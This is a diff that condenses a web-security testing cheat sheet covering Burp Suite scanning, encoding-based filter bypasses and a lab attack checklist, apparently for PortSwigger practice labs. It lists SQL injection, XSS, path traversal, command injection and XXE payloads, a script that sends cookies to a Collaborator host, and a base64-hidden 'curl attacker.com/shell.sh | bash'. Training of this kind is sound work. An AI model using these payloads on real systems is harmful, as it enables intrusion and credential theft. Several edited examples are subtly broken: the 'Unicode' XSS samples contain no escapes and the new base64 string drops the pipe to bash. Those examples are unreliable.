@@ -1,601 +1,171 @@
 # Essential Skills - Cheat Sheet
 
-**Rapid reference for essential web application security testing techniques**
+Rapid reference for essential web application security testing techniques.
 
 ---
 
 ## Core Techniques
 
-### 1. Targeted Scanning
+### Targeted scanning (Burp)
 
-**Purpose:** Scan specific requests instead of entire application
+Use when time-constrained, when one endpoint is suspicious, or for large apps. Burp Proxy → HTTP History → right-click request → "Do active scan" → choose `All except time-based detection`. Review findings as they arrive.
 
-**When to Use:**
-- Time constraints
-- Identified suspicious endpoint
-- High-value feature (auth, search, file ops)
+### Scan selected insertion point
 
-**How to Use:**
-```
-1. Burp Proxy → HTTP History
-2. Find suspicious request
-3. Right-click → "Do active scan" or "Scan"
-4. Configuration: "All except time-based detection"
-5. Review findings in real-time
-```
+For non-standard data structures: delimited values (`user:token`, `id|role`), JSON in headers/cookies, base64-with-internal-structure. Send to Repeater → highlight only the inner field → right-click → "Scan selected insertion point".
 
-**Advantages:**
-- 10x faster than full-site scan
-- Focused results
-- Fewer false positives
-- Better time management
-
----
-
-### 2. Scan Selected Insertion Point
-
-**Purpose:** Test specific portion of request (non-standard data structures)
-
-**When to Use:**
-- Delimited values: `username:token`, `id|role`
-- JSON in headers/cookies: `{"user":"admin"}`
-- Base64-encoded data with internal structure
-- Custom serialization formats
-
-**How to Use:**
-```
-1. Send request to Repeater
-2. Highlight ONLY the specific portion to test
-   Example: In "session=wiener:token", highlight "wiener"
-3. Right-click highlighted text
-4. Select "Scan selected insertion point"
-5. Review findings
-```
-
-**Example:**
 ```http
-Cookie: session=wiener:AbCdEfGhIjKlMnOp1234567890
-                ^^^^^^
-                Highlight username only, not entire cookie
+Cookie: session=wiener:AbCdEfGh...
+                ^^^^^^   highlight only this slice
 ```
 
 ---
 
 ## Encoding Techniques
 
-### URL Encoding
+**URL** — `space=%20|+ <=%3C >=%3E '=%27 "=%22 /=%2F \=%5C ;=%3B &=%26`. Double-encode `%2F → %252F` when filter decodes once. Path traversal: `../../../etc/passwd` blocked → `..%2f..%2f..%2fetc%2fpasswd` blocked → `..%252f..%252fetc%252fpasswd` often passes.
 
-**Single Encoding:**
-```
-Space = %20 or +
-<     = %3C
->     = %3E
-'     = %27
-"     = %22
-/     = %2F
-\     = %5C
-;     = %3B
-&     = %26
-```
+**HTML** — `<=&lt;|&#60;|&#x3C; >=&gt;|&#62;|&#x3E; "=&quot;|&#34; '=&#39;|&apos; &=&amp;`. XSS encoded: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>` runs `alert(1)`.
 
-**Double Encoding:**
-```
-/  = %2F = %252F (% is encoded as %25)
-<  = %3C = %253C
-```
+**XML entities** (SQL keyword bypass in XML body): `1 &#85;NION &#83;ELECT NULL` or `1 &#x55;NION &#x53;ELECT NULL`.
 
-**Use Case:** Bypass filters that decode only once
+**JS Unicode** (`\uXXXX`): `<script>alert(1)</script>`. Use in JS-string contexts.
 
-**Example - Path Traversal:**
-```
-Normal:  ../../../../etc/passwd (blocked)
-Encoded: ..%2f..%2f..%2f..%2fetc%2fpasswd (blocked)
-Double:  ..%252f..%252f..%252f..%252fetc%252fpasswd (allowed ✓)
-```
+**SQL hex / CHAR()**: `WHERE username=0x61646d696e` or `WHERE username=CHAR(97,100,109,105,110)`. Bypass quote/keyword filters.
+
+**Base64**: `echo -n payload | base64` / `base64 -d`. Useful for JWTs and chained obfuscation: `; echo Y3VybCBhdHRhY2tlci5jb20vc2hlbGwuc2gK | base64 -d | bash`.
 
 ---
 
-### HTML Encoding
+## Burp Suite Quick Commands
 
-**Named Entities:**
-```
-<  = &lt;
->  = &gt;
-"  = &quot;
-'  = &apos; or &#39;
-&  = &amp;
-```
+**Scanner configurations**:
+- Fast: `Audit checks → All except time-based detection`
+- Thorough: `Audit checks → All`
+- Custom (XSS focus): `Cross-site scripting (reflected/stored/DOM)` only
 
-**Decimal:**
-```
-<  = &#60;
->  = &#62;
-'  = &#39;
-"  = &#34;
-```
+**Collaborator**: Burp menu → Burp Collaborator client → "Copy to clipboard" → paste into payload → "Poll now" → review HTTP/DNS interactions. Exfil format: `?c=<data>` in URL.
 
-**Hexadecimal:**
-```
-<  = &#x3C;
->  = &#x3E;
-'  = &#x27;
-"  = &#x22;
-```
+**Repeater**: Ctrl/Cmd-R send-to-repeater, Ctrl-Space send. Right-click in request body → "Scan" or "Scan selected insertion point".
 
-**Use Case:** XSS bypass, attribute injection
-
-**Example:**
-```html
-Normal:  <img src=x onerror=alert(1)>
-Encoded: <img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
-         (alert(1) is HTML entity encoded)
-```
-
----
-
-### XML Encoding
-
-**XML Entities:**
-```
-<  = &lt;
->  = &gt;
-&  = &amp;
-"  = &quot;
-'  = &apos;
-```
-
-**Numeric Character References:**
-```
-<  = &#60; or &#x3C;
->  = &#62; or &#x3E;
-U  = &#85; or &#x55;
-S  = &#83; or &#x53;
-```
-
-**Use Case:** Bypass SQL keyword filters in XML requests
-
-**Example - SQL Injection in XML:**
-```xml
-<!-- Blocked -->
-<storeId>1 UNION SELECT NULL</storeId>
-
-<!-- Bypass with XML entities -->
-<storeId>1 &#85;NION &#83;ELECT NULL</storeId>
-
-<!-- Or hex -->
-<storeId>1 &#x55;NION &#x53;ELECT NULL</storeId>
-```
-
----
-
-### JavaScript Unicode
-
-**Format:** `\uXXXX` (4 hex digits)
-
-```
-<  = \u003c
->  = \u003e
-'  = \u0027
-"  = \u0022
-/  = \u002f
-a  = \u0061
-l  = \u006c
-e  = \u0065
-r  = \u0072
-t  = \u0074
-```
-
-**Use Case:** JavaScript context XSS
-
-**Example:**
-```javascript
-// Normal
-<script>alert(1)</script>
-
-// Unicode encoded
-<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
-```
-
----
-
-### SQL Encoding
-
-**Hexadecimal:**
-```sql
--- String 'admin' as hex
-SELECT * FROM users WHERE username=0x61646d696e
-
--- Avoiding quotes
-' OR '1'='1 → 0x27204f52202731273d2731
-```
-
-**CHAR() Function:**
-```sql
--- 'admin' using CHAR()
-CHAR(97,100,109,105,110)
-
--- 'UNION' using CHAR()
-CHAR(85,78,73,79,78)
-```
-
-**Use Case:** Bypass quote/keyword filters
-
-**Example:**
-```sql
--- Blocked
-SELECT * FROM users WHERE username='admin'
-
--- Bypass
-SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)
-```
-
----
-
-### Base64 Encoding
-
-**Format:** A-Z, a-z, 0-9, +, /
-
-**Encoding/Decoding:**
-```bash
-# Encode
-echo -n "payload" | base64
-# Output: cGF5bG9hZA==
-
-# Decode
-echo "cGF5bG9hZA==" | base64 -d
-# Output: payload
-```
-
-**Use Case:** Complex payload obfuscation, JWT manipulation
-
-**Example - Command Injection:**
-```bash
-# Original (blocked)
-; curl attacker.com/shell.sh | bash
-
-# Base64 obfuscated
-; echo "Y3VybCBhdHRhY2tlci5jb20vc2hlbGwuc2ggfCBiYXNo" | base64 -d | bash
-```
-
----
-
-## Burp Suite Commands
-
-### Scanner Settings
-
-**Fast Configuration (Time-Constrained):**
-```
-Scanner → Scan configuration → New
-Audit checks → All except time-based detection ✓
-```
-
-**Thorough Configuration:**
-```
-Audit checks → All ✓
-```
-
-**Custom (XSS Focus):**
-```
-Audit checks → Custom
-Select: Cross-site scripting (reflected/stored/DOM)
-```
-
----
-
-### Collaborator
-
-**Access:**
-```
-Burp menu → Burp Collaborator client
-```
-
-**Copy URL:**
-```
-Click "Copy to clipboard"
-Format: YOUR-ID.oastify.com
-```
-
-**Poll for Callbacks:**
-```
-Click "Poll now"
-Review HTTP/DNS interactions
-```
-
-**Extract Data:**
-```
-HTTP requests show exfiltrated data in URL parameters
-Example: /?c=session=admin:token
-```
-
----
-
-### Repeater
-
-**Shortcuts:**
-```
-Ctrl+R / Cmd+R = Send to Repeater
-Ctrl+Space = Send request
-Ctrl+Shift+R = Change request method (GET ↔ POST)
-```
-
-**Scan from Repeater:**
-```
-Right-click in Request → "Scan" or "Do active scan"
-Right-click highlighted text → "Scan selected insertion point"
-```
-
----
-
-### Decoder
-
-**Access:**
-```
-Burp menu → Decoder (or dedicated tab)
-```
-
-**Usage:**
-```
-1. Paste text/data
-2. Select encoding from dropdown:
-   - URL
-   - HTML
-   - Base64
-   - Hex
-   - ASCII hex
-   - Gzip
-3. Apply encoding/decoding
-4. Chain multiple operations
-```
+**Decoder**: paste data → choose URL/HTML/Base64/Hex/Gzip → encode/decode (chain operations).
 
 ---
 
 ## Mystery Lab Strategy
 
-### Reconnaissance Checklist (15 min)
+### Recon (15 min)
 
-**Features to Map:**
-- [ ] Authentication (login, registration, password reset)
-- [ ] Search functionality
-- [ ] User-generated content (comments, posts)
-- [ ] File upload
-- [ ] Admin panel (/admin, /administrator)
-- [ ] APIs (check network tab)
-- [ ] User profile/account settings
+Authentication (login/registration/reset), search, user-generated content (comments/posts), file upload, admin panel (`/admin`, `/administrator`), APIs (browser network tab), profile/account settings.
 
----
+### Vulnerability sweep (30 min)
 
-### Vulnerability Testing Checklist (30 min)
-
-**SQL Injection:**
 ```
-' OR '1'='1'--
-1' UNION SELECT NULL--
-1' UNION SELECT NULL,NULL--
-1' ORDER BY 1--
+SQLi          : ' OR '1'='1'--   1' UNION SELECT NULL--   1' ORDER BY 1--
+XSS           : <script>alert(1)</script>   <img src=x onerror=alert(1)>   <svg/onload=alert(1)>
+Access ctrl   : /admin   IDOR via id params   role swap   POST↔GET method swap
+Path traversal: ../../../../etc/passwd   ..%2f...%2fetc%2fpasswd   ..%252f...%252fetc%252fpasswd
+Cmd injection : ; whoami   | whoami   `whoami`   $(whoami)
+XXE           : <!DOCTYPE foo[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
+CSRF          : check token presence + validation + SameSite + method downgrade
 ```
 
-**XSS:**
-```
-<script>alert(1)</script>
-<img src=x onerror=alert(1)>
-<svg/onload=alert(1)>
-```
+### Likely-vuln-by-feature
 
-**Access Control:**
-```
-- Try accessing /admin
-- Manipulate ID parameters (IDOR)
-- Test with different user roles
-- Change HTTP methods (POST → GET)
-```
-
-**Path Traversal:**
-```
-../../../../etc/passwd
-..%2f..%2f..%2f..%2fetc%2fpasswd
-..%252f..%252f..%252f..%252fetc%252fpasswd
-```
-
-**Command Injection:**
-```
-; whoami
-| whoami
-` whoami `
-$(whoami)
-```
-
-**XXE (if XML endpoint):**
-```xml
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<root>&xxe;</root>
-```
-
-**CSRF:**
-```
-- Check for anti-CSRF tokens
-- Test token validation
-- Try removing token
-```
-
----
-
-### Common Vulnerability Locations
-
-| Feature | Likely Vulnerability |
-|---------|---------------------|
-| Login/Auth | SQLi, brute force, timing attacks |
+| Feature | Likely class |
+|---------|---|
+| Login / auth | SQLi, brute force, timing |
 | Search | SQLi, XSS |
-| Comments | Stored XSS, CSRF |
-| File Upload | RCE, path traversal, XXE |
-| User Profile | IDOR, XSS, CSRF |
-| Admin Panel | Access control bypass |
-| API Endpoints | IDOR, mass assignment, XXE |
-| Password Reset | Account takeover, parameter pollution |
+| Comments / UGC | Stored XSS, CSRF |
+| File upload | RCE, traversal, XXE |
+| User profile | IDOR, XSS, CSRF |
+| Admin panel | Access control bypass |
+| API endpoints | IDOR, mass assignment, XXE |
+| Password reset | Account takeover, parameter pollution |
 
 ---
 
-## Context-Specific Encoding Reference
+## Encoding by Context
 
-| Context | Encoding Required | Example |
-|---------|------------------|---------|
-| URL Parameter | URL Encoding | `?search=%3Cscript%3E` |
-| HTML Body | HTML Entities | `<div>&#60;script&#62;</div>` |
-| JavaScript String | Unicode / Escaping | `var x='\u003cscript\u003e';` |
-| SQL String | Hex / CHAR() | `WHERE id=0x31` or `CHAR(49)` |
-| XML Data | XML Entities | `<data>&#60;script&#62;</data>` |
-| JSON Value | JSON Escaping | `{"input":"\u003cscript\u003e"}` |
-| HTTP Header | ASCII / URL | `Header: value%0d%0a` |
-| Cookie | URL Encoding | `Cookie: name=%3Cscript%3E` |
+| Context | Encoding | Example |
+|---|---|---|
+| URL parameter | URL | `?search=%3Cscript%3E` |
+| HTML body | HTML entities | `<div>&#60;script&#62;</div>` |
+| JS string | Unicode escape | `var x='<script>';` |
+| SQL string | Hex / CHAR() | `WHERE id=0x31` |
+| XML data | XML entities | `<data>&#60;script&#62;</data>` |
+| JSON value | JSON escape | `{"input":"<script>"}` |
+| HTTP header | ASCII / URL | `Header: value%0d%0a` |
+| Cookie | URL encoding | `Cookie: name=%3Cscript%3E` |
 
 ---
 
-## Time Management
+## Time Allocation Template
 
-### Phase Time Allocation
-
-**Time-Constrained Assessment:**
 ```
-0-15 min:  Reconnaissance - map features and inputs
+0-15 min : Recon — features, inputs, cookies, JS bundles
 15-20 min: Hypothesis generation
 20-50 min: Systematic testing
 50-65 min: Exploitation
-65-70 min: Verification
+65-70 min: Verification + evidence
 ```
 
 ---
 
-## Common Mistakes
+## Anti-Patterns
 
-### ❌ Don't Do This
+- Full-site scans wasting time on irrelevant endpoints
+- Ignoring scanner findings or waiting until scan completes
+- Scanning the entire cookie instead of a sub-field
+- Forgetting to URL-encode payloads in cookies / headers
+- Forgetting to poll Collaborator
+- Over-encoding when only one char needs it
 
-1. **Running full-site scans** - Wastes time, too many results
-2. **Ignoring scanner findings** - Missing valuable hints
-3. **Not reviewing findings in real-time** - Waiting for scan completion
-4. **Testing entire cookie/parameter** - Should use "Scan selected insertion point"
-5. **Not URL-encoding payloads in cookies** - Payloads may not parse correctly
-6. **Forgetting to poll Collaborator** - Missing exfiltrated data
-7. **Over-encoding** - Encoding everything when only specific chars need it
+## Best Practices
 
----
-
-### ✅ Best Practices
-
-1. **Targeted scans** - Scan specific requests, not entire app
-2. **Scan selected insertion points** - Test non-standard data structures
-3. **Review findings immediately** - Don't wait for scan completion
-4. **Verify manually** - Always confirm scanner findings
-5. **Use Collaborator** - For blind vulnerabilities and data exfiltration
-6. **Start simple** - Test basic payload before encoding
-7. **Combine techniques** - Human intuition + automated testing
+- Targeted scans over full-site scans; review findings as they arrive
+- "Scan selected insertion point" for non-standard structures
+- Verify scanner findings manually
+- Use Collaborator for blind classes and exfil
+- Start simple, then encode; combine techniques
 
 ---
 
-## Quick Decision Tree
+## Decision Trees
 
-### Should I Use Targeted Scanning?
-
-```
-Is there a time constraint? → YES → Use targeted scanning
-Do I have a suspicious endpoint? → YES → Use targeted scanning
-Is the app large (100+ pages)? → YES → Use targeted scanning
-Am I testing everything? → NO → Use targeted scanning
-```
-
-### Should I Use "Scan Selected Insertion Point"?
-
-```
-Is the data delimited (user:token, id|role)? → YES
-Is there JSON in a header/cookie? → YES
-Is there Base64 with internal structure? → YES
-Is the format non-standard? → YES
-```
-
-### What Encoding Should I Try?
-
-```
-Is the context a URL parameter? → URL encoding
-Is it reflected in HTML? → HTML entities
-Is it in a JavaScript string? → Unicode escaping
-Is it XML with keyword filter? → XML entities
-Is it SQL with quote filter? → Hex or CHAR()
-Is everything blocked? → Double encoding or Base64
-```
+**Targeted scan?** Time pressure / known suspicious endpoint / large app / not testing everything → yes.
+**"Scan selected insertion point"?** Delimited value / JSON in header-cookie / base64 with structure / non-standard format → yes.
+**Encoding to try?** URL param → URL. HTML body → entities. JS string → Unicode. XML keyword filter → XML entities. SQL quote filter → hex / CHAR(). Everything blocked → double-encode or base64.
 
 ---
 
 ## Keyboard Shortcuts
 
-### Burp Suite
-
 ```
-Ctrl+Shift+B / Cmd+Shift+B = Burp menu
-Ctrl+R / Cmd+R = Send to Repeater
-Ctrl+I / Cmd+I = Send to Intruder
-Ctrl+Space = Send request (in Repeater)
-Ctrl+Shift+R = Change request method
-```
-
-### Browser
-
-```
-F12 = Developer tools
-Ctrl+Shift+C = Inspect element
-Ctrl+R = Reload
-Ctrl+Shift+R = Hard reload (clear cache)
+Burp:   Ctrl-R send-to-Repeater   Ctrl-I send-to-Intruder   Ctrl-Space send
+        Ctrl-Shift-R change method
+Browser: F12 devtools   Ctrl-Shift-C inspect   Ctrl-R reload   Ctrl-Shift-R hard reload
 ```
 
 ---
 
-## One-Liner Reference
+## One-Liners
 
-**Targeted Scan:**
 ```
-Right-click request → "Do active scan" → "All except time-based"
-```
-
-**Scan Insertion Point:**
-```
-Highlight text → Right-click → "Scan selected insertion point"
-```
-
-**Collaborator:**
-```
-Burp menu → Burp Collaborator → Copy → Poll
-```
-
-**Encode URL:**
-```
-Burp Decoder → Paste → "Encode as... URL"
-```
-
-**Encode HTML:**
-```
-Burp Decoder → Paste → "Encode as... HTML"
-```
-
-**XXE (XInclude):**
-```xml
-<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
-```
-
-**XSS Cookie Injection:**
-```html
-<script>location='https://COLLAB/?c='+document.cookie</script>
-```
-
-**SQL XML Encoding:**
-```xml
-&#85;NION &#83;ELECT = UNION SELECT
+Targeted scan        : right-click request → Do active scan → All except time-based
+Insertion-point scan : highlight slice → right-click → Scan selected insertion point
+Collaborator         : Burp menu → Collaborator → Copy → Poll now
+URL encode           : Decoder → paste → Encode as → URL
+HTML encode          : Decoder → paste → Encode as → HTML
+XXE XInclude         : <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse=text href=file:///etc/passwd/></foo>
+XSS cookie exfil     : <script>location='https://COLLAB/?c='+document.cookie</script>
+SQL XML keyword      : &#85;NION &#83;ELECT  ==  UNION SELECT
 ```
 
 ---
 
 ## Resources
 
-**Learning Resources:**
-- Web Security Academy (Burp Suite docs): https://portswigger.net/web-security/essential-skills
+- Web Security Academy (essential skills): https://portswigger.net/web-security/essential-skills
 - OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
-
-**This Skill:**
-- [Quick Start](./essential-skills-quickstart.md)
-- [Resources](./essential-skills-resources.md)
+- [Quick Start](./essential-skills-quickstart.md), [Resources](./essential-skills-resources.md), [Index](./essential-skills-index.md)
